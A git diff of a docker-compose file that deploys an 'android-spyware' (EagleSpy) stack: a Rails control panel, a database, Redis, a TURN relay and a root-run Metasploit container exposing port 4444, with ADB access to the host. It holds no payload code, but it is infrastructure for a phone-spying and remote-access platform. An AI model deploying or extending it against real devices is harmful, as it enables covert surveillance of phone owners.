@@ -1,29 +1,95 @@
+version: '3.8'
+
 services:
+  db:
+    image: costincanciu/android-spyware-db:latest
+    ports:
+      - "5432:5432"
+    volumes:
+      - db:/var/lib/postgresql/data
+      - ../backups:/backups
+      - ./postgres-wal-config/postgresql.conf:/etc/postgresql/postgresql.conf
+    networks:
+      - eaglespy-network
+    environment:
+      POSTGRES_USER: ${POSTGRES_USER:-postgres}
+      POSTGRES_PASSWORD: ${POSTGRES_PASSWORD:-CHANGE_ME_IN_PRODUCTION}
+      POSTGRES_HOST_AUTH_METHOD: scram-sha-256
+    command: postgres -c config_file=/etc/postgresql/postgresql.conf
+    healthcheck:
+      test: ["CMD-SHELL", "pg_isready -U ${POSTGRES_USER:-postgres}"]
+      interval: 10s
+      timeout: 5s
+      retries: 5
+      start_period: 10s
+    deploy:
+      resources:
+        limits:
+          cpus: '2'
+          memory: 2G
+        reservations:
+          cpus: '1'
+          memory: 1G
+    restart: unless-stopped
+
+  redis:
+    image: redis:7-alpine
+    container_name: redis
+    ports:
+      - "6379:6379"
+    volumes:
+      - redis_data:/data
+    networks:
+      - eaglespy-network
+    command: redis-server --appendonly yes --requirepass "${REDIS_PASSWORD}" --maxmemory 512mb --maxmemory-policy allkeys-lru
+    environment:
+      REDIS_PASSWORD: ${REDIS_PASSWORD}
+    healthcheck:
+      test: ["CMD", "redis-cli", "--no-auth-warning", "-a", "${REDIS_PASSWORD}", "ping"]
+      interval: 10s
+      timeout: 3s
+      retries: 3
+      start_period: 5s
+    deploy:
+      resources:
+        limits:
+          cpus: '0.5'
+          memory: 512M
+        reservations:
+          cpus: '0.25'
+          memory: 256M
+    restart: unless-stopped
+
   rails-app:
     image: costincanciu/android-spyware:latest
     depends_on:
-      - db
-      - metasploit
-      - redis
-      - coturn
+      db:
+        condition: service_healthy
+      redis:
+        condition: service_healthy
+      metasploit:
+        condition: service_started
+      coturn:
+        condition: service_started
     env_file:
       - ../.env
       - ../.env.tracing
+      - ../.env.ai
     ports:
       - "8080:3000"
+    networks:
+      - eaglespy-network
     volumes:
       - ../:/app/android-spyware
-      # SECURITY: Docker socket mount removed - container escape risk
-      # - //var/run/docker.sock://var/run/docker.sock
+      - bundle_cache:/usr/local/bundle
     working_dir: /app/android-spyware
     entrypoint: >
       sh -c "rm -f tmp/pids/server.pid && 
              bundle install && 
              rails db:migrate 2>/dev/null || rails db:setup &&
+             WEBPACKER_PRECOMPILE=false rails assets:precompile &&
              rails s -b 0.0.0.0 -p 3000"
     tty: true
-    mem_limit: 2g
-    memswap_limit: 2g
     environment:
       ADB_HOST: host.docker.internal
       JAEGER_HOST: jaeger-collector
@@ -32,10 +98,75 @@ services:
       POSTGRES_USER: ${POSTGRES_USER:-postgres}
       POSTGRES_PASSWORD: ${POSTGRES_PASSWORD:-postgres}
       ANDROIDSPYWARE_DATABASE_HOST: db
-      REDIS_URL: redis://redis:6379/1
+      REDIS_URL: redis://:${REDIS_PASSWORD:-}@redis:6379/1
       TURN_SERVER: turn:coturn:3478
       TURN_USER: ${TURN_USER:-eaglespy}
       TURN_PASSWORD: ${TURN_PASSWORD:-eaglespy_secret}
+      DEVICE_AUTH_TOKEN: ${DEVICE_AUTH_TOKEN:-CHANGE_ME_BEFORE_DEPLOYMENT}
+      SECRET_KEY_BASE: ${SECRET_KEY_BASE:-development_secret_key_base_for_testing_only}
+      RAILS_MAX_THREADS: "10"
+      RAILS_MIN_THREADS: "5"
+    healthcheck:
+      test: ["CMD", "curl", "-f", "http://localhost:3000/health/live"]
+      interval: 30s
+      timeout: 10s
+      retries: 3
+      start_period: 60s
+    deploy:
+      resources:
+        limits:
+          cpus: '4'
+          memory: 4G
+        reservations:
+          cpus: '2'
+          memory: 2G
+      restart_policy:
+        condition: on-failure
+        delay: 5s
+        max_attempts: 3
+        window: 120s
+    logging:
+      driver: "json-file"
+      options:
+        max-size: "10m"
+        max-file: "3"
+    restart: unless-stopped
+
+  frontend:
+    build:
+      context: ../frontend
+      dockerfile: Dockerfile
+      cache_from:
+        - eaglespy-frontend:latest
+    image: eaglespy-frontend:latest
+    ports:
+      - "5173:80"
+    depends_on:
+      rails-app:
+        condition: service_healthy
+    networks:
+      - eaglespy-network
+    healthcheck:
+      test: ["CMD", "curl", "-f", "http://localhost/health"]
+      interval: 30s
+      timeout: 3s
+      retries: 3
+      start_period: 10s
+    deploy:
+      resources:
+        limits:
+          cpus: '0.5'
+          memory: 256M
+        reservations:
+          cpus: '0.25'
+          memory: 128M
+    logging:
+      driver: "json-file"
+      options:
+        max-size: "5m"
+        max-file: "2"
+    restart: unless-stopped
+
   jaeger:
     image: jaegertracing/all-in-one:latest
     container_name: jaeger-collector
@@ -48,44 +179,52 @@ services:
       - "16686:16686"
       - "14250:14250"
       - "9411:9411"
+    networks:
+      - eaglespy-network
     labels:
       - "com.example.description=Jaeger tracing collector for android-spyware"
-  db:
-    image: costincanciu/android-spyware-db:latest
-    expose:
-      - "5432"
-    volumes:
-      - db:/var/lib/postgresql/data
-    environment:
-      # SECURITY: Use password authentication instead of trust
-      POSTGRES_USER: ${POSTGRES_USER:-postgres}
-      POSTGRES_PASSWORD: ${POSTGRES_PASSWORD:-CHANGE_ME_IN_PRODUCTION}
-      POSTGRES_HOST_AUTH_METHOD: scram-sha-256
+    healthcheck:
+      test: ["CMD", "wget", "--quiet", "--tries=1", "--spider", "http://localhost:16686/"]
+      interval: 30s
+      timeout: 5s
+      retries: 3
+    deploy:
+      resources:
+        limits:
+          cpus: '1'
+          memory: 512M
+    restart: unless-stopped
+
   metasploit:
     container_name: kali_container
     image: costincanciu/android-spyware-msf:latest
     ports:
       - "2222:2222"
       - "4444:4444"
+    networks:
+      - eaglespy-network
     user: root
     volumes:
       - ../files:/root/files
-  redis:
-    image: redis:7-alpine
-    container_name: redis
-    ports:
-      - "6379:6379"
-    volumes:
-      - redis_data:/data
-    command: redis-server --appendonly yes --requirepass "${REDIS_PASSWORD}"
-    environment:
-      REDIS_PASSWORD: ${REDIS_PASSWORD}
+    deploy:
+      resources:
+        limits:
+          cpus: '2'
+          memory: 2G
+        reservations:
+          cpus: '1'
+          memory: 1G
+    restart: unless-stopped
+
   coturn:
     image: coturn/coturn:latest
     container_name: coturn
     ports:
       - "3490:3478"
       - "3490:3478/udp"
+      - "49152-49200:49152-49200/udp"
+    networks:
+      - eaglespy-network
     environment:
       TURN_USER: ${TURN_USER:-eaglespy}
       TURN_PASSWORD: ${TURN_PASSWORD:-CHANGE_ME_IN_PRODUCTION}
@@ -97,10 +236,31 @@ services:
       --fingerprint
       --lt-cred-mech
       --user=${TURN_USER:-eaglespy}:${TURN_PASSWORD:-CHANGE_ME_IN_PRODUCTION}
-      --realm=${RAILS_HOST:-localhost}
-      --external-ip=${RAILS_HOST:-127.0.0.1}
+      --realm=192.168.1.13
+      --external-ip=192.168.1.13
       --listening-ip=0.0.0.0
       --no-stun
+    healthcheck:
+      test: ["CMD", "nc", "-z", "localhost", "3478"]
+      interval: 30s
+      timeout: 5s
+      retries: 3
+      start_period: 10s
+    deploy:
+      resources:
+        limits:
+          cpus: '1'
+          memory: 512M
+        reservations:
+          cpus: '0.5'
+          memory: 256M
+    restart: unless-stopped
+
 volumes:
   db:
   redis_data:
+  bundle_cache:
+
+networks:
+  eaglespy-network:
+    driver: bridge
